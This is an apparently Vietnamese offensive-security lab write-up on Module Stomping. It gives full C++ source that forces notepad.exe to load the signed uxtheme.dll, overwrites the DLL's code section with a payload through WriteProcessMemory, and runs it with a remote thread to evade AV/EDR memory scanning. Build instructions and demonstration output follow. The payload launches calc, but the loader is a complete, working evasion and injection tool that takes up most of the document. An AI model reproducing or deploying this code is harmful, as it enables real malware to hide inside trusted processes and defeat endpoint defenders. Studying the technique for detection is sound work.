
---

# 📝 [PE 16] Module Stomping (Hiding in Plain Sight)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Module Stomping** (còn gọi là *Module Overwriting*) là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ trinh sát RAM chuyên sâu.

Khi các giải pháp EDR hiện đại thực hiện quét bộ nhớ ảo (Memory Scanning/YARA Scanning), chúng thường tập trung soi rất kỹ các trang bộ nhớ vô danh (Unbacked Memory - trang nhớ thuộc loại `MEM_PRIVATE` không liên kết với file nào trên đĩa) mang quyền thực thi.

Lab PE 16 hóa giải bài toán này bằng cách **ép tiến trình vỏ bọc nạp một DLL hợp pháp** từ hệ thống (ví dụ: `amsi.dll` hoặc `uxtheme.dll`). Sau khi DLL này được ánh xạ lên RAM dưới dạng trang nhớ có liên kết file gốc (`MEM_IMAGE`), Loader sẽ dùng quyền `WriteProcessMemory` để **ghi đè mã máy Payload vào phân vùng mã thực thi của chính DLL đó**. Khi CPU chạy mã, dòng chảy sẽ kích nổ Payload của ta lọt lòng bên trong một Module có chứng chỉ bảo mật của Microsoft, bẻ gãy hoàn toàn các bộ lọc Memory Scanner.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% cơ chế phát hiện trang nhớ vô danh (`Unbacked Executable Memory / MEM_PRIVATE`) của AV/EDR.
* Làm chủ kỹ thuật điều hướng nạp Module từ xa thông qua chuỗi API `LoadLibrary`.
* Thực hiện giải pháp giẫm đạp tính toán Offset chính xác để ký sinh mã máy mà không làm sập cấu trúc tiến trình cha.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một DLL được nạp vào tiến trình thông qua cấu trúc PE Loader, hệ điều hành Windows sẽ chuyển trạng thái phân vùng RAM đó thành loại **`MEM_IMAGE`**. Đây là phân vùng đại diện cho các tệp nhị phân hợp pháp được ánh xạ từ đĩa cứng lên bộ nhớ ảo.

Quy trình toán học giải phẫu bản đồ RAM và giẫm đạp Module của Lab PE 16 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[Inject DLL Path] ──> [CreateRemoteThread -> LoadLibrary] ──> [Quét Module Base] ──> [WriteProcessMemory: Giẫm đạp phân đoạn RX] ──> [Khai hỏa]

```

1. **Ép nạp Module hợp pháp làm bia đỡ đạn**: Loader tiêm chuỗi đường dẫn của một DLL ít dùng nhưng hợp pháp của Windows (ví dụ: `C:\Windows\System32\uxtheme.dll`) vào RAM tiến trình đích, sau đó tạo một luồng từ xa ép tiến trình đích gọi hàm `LoadLibraryW`. DLL xịn này được nạp lên RAM với đầy đủ tư cách pháp nhân (loại `MEM_IMAGE` mang cờ bảo vệ `PAGE_EXECUTE_READ` - RX).
2. **Định vị điểm giẫm đạp**: Loader sử dụng danh sách `CreateToolhelp32Snapshot` để bốc tách chính xác địa chỉ Base Address sống của DLL vừa nạp trên RAM tiến trình đích.
3. **Khai hỏa giẫm đạp hành vi (WPM Stomping)**: Loader dùng hàm `WriteProcessMemory` trỏ thẳng vào địa chỉ Base Address (hoặc phân đoạn `.text` thực thi của DLL) để ghi đè khối mã máy Payload lên. Tương tự cơ chế của PE 10, hàm `WriteProcessMemory` sẽ kích hoạt tính năng bypass ngầm của Kernel, lật cờ bảo vệ sang `RWX` tạm thời để ghi đè Payload rồi tự động hoàn trả cờ `RX` ban đầu, hợp thức hóa Module che giấu hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tìm kiếm PID và tính toán Offset địa chỉ sống động trên RAM chéo tiến trình.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
DWORD WINAPI StompedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Hãm luồng ký sinh để giữ trạng thái an toàn cho tiến trình cha
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm giải phẫu RAM tìm Base Address của Module cụ thể inside tiến trình đích
PVOID GetRemoteModuleBase(DWORD pid, const std::wstring& moduleName) {
    PVOID baseAddress = NULL;
    MODULEENTRY32W me32;
    me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, moduleName.c_str()) == 0) {
                baseAddress = (PVOID)me32.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);
    return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 16: MODULE STOMPING INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // ─── BƯỚC 1: ÉP TIẾN TRÌNH ĐÍCH NẠP MỘT DLL HỢP PHÁP LÀM BIA ĐỠ ĐẠN ───
    std::wstring dllToLoad = L"C:\\Windows\\System32\\uxtheme.dll"; // Sử dụng Signed DLL xịn của OS
    SIZE_T pathSize = (dllToLoad.length() + 1) * sizeof(wchar_t);

    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePathBuffer, dllToLoad.c_str(), pathSize, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    std::cout << "[*] Dang ep Notepad nap module uxtheme.dll xịn..." << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);
    if (hLoadThread) {
        WaitForSingleObject(hLoadThread, INFINITE);
        CloseHandle(hLoadThread);
    }
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE); // Dọn dẹp chuỗi đường dẫn thô

    // ─── BƯỚC 2: TRÍCH XUẤT TỌA ĐỘ BASE ADDRESS CỦA MODULE VỪA NẠP ───
    PVOID remoteModuleBase = GetRemoteModuleBase(pid, L"uxtheme.dll");
    if (!remoteModuleBase) {
        std::cerr << "[-] Khong the thiet lap va định vi Module muc tieu!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Săn trung Module Base cua uxtheme.dll tai RAM đối phuong: 0x" << std::hex << remoteModuleBase << std::endl;

    // Tính toán tịnh tiến offset an toàn nhảy qua PE Header (ví dụ: nhảy vào entry phân đoạn mã máy .text)
    PVOID stompTargetAddress = (PVOID)((DWORD_PTR)remoteModuleBase + 0x1000); 
    std::cout << "[+] Toa do hốc xac dinh de thuc hien giam dap (Stomp): 0x" << std::hex << stompTargetAddress << std::endl;

    SIZE_T functionSize = 500;
    // Cấp phát riêng một phân vùng nhỏ mang quyền RW thông thường chỉ để chứa dữ liệu bảng tham số tuyệt đối
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy dữ liệu cấu trúc tham số tuyệt đối sang RAM Notepad trước
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 3: GIẪM ĐẠP BỘ NHỚ (STOMPING) - GHI ĐÈ PAYLOAD LÊN PHÂN ĐOẠN MODULE XỊN ───
    std::cout << "[*] Dang thuc hien hanh vi Giam dap (Stomp) de bẹp ma may cua ta vao lòng uxtheme.dll..." << std::endl;
    BOOL isStomped = WriteProcessMemory(hProcess, stompTargetAddress, (LPCVOID)StompedPayload, functionSize, NULL);

    if (!isStomped) {
        std::cerr << "[-] WriteProcessMemory giam dap that bai!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Hanh vi Giam dap hoan tat! Ma may cua ta da nằm tron trong Signed Module." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG THỰC THI TRÊN TỌA ĐỘ ĐÃ GIẪM ĐẠP ───
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread xuyen biên gioi de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stompTargetAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Chờ đồng bộ ngắn giải phóng luồng máy tính
        std::cout << "[+] Luong Thread giam dap da khoi hoa thanh cong!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi vùng chứa cấu trúc tham số và đóng handle phẳng sạch
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] Module Stomping Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ thư viện hệ thống.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án:

```powershell
PS C:\Workspace\x64\Release> .\PE16_Module_Stomping.exe
====================================================
[*] PE 16: MODULE STOMPING INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 11048
[*] Dang ep Notepad nap module uxtheme.dll xịn...
[+] Săn trung Module Base cua uxtheme.dll tai RAM đối phuong: 0x00007ffca38b0000
[+] Toa do hốc xac dinh de thuc hien giam dap (Stomp): 0x00007ffca38b1000
[+] Ghi ma may vao phan vung ky sinh hoan tot.
[*] Dang thuc hien Giam dap (Stomp) de bẹp ma may cua ta vao lòng uxtheme.dll...
[+] Hanh vi Giam dap hoan tat! Ma may cua ta da nằm tron trong Signed Module.
[*] Dang khoi tao luong CreateRemoteThread xuyen biên gioi de kich no...
[+] Luong Thread giam dap da khoi hoa thanh cong!

[+] Module Stomping Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**! Lúc này, nếu một bộ quét RAM động của giải pháp an ninh thực hiện kiểm tra luồng đang chạy, nó sẽ thấy điểm thực thi nằm hoàn toàn bên trong không gian địa chỉ hợp pháp của `uxtheme.dll` - một module có chữ ký xịn của Microsoft, giúp mã máy vượt qua vòng thẩm định an toàn tuyệt đối!

---

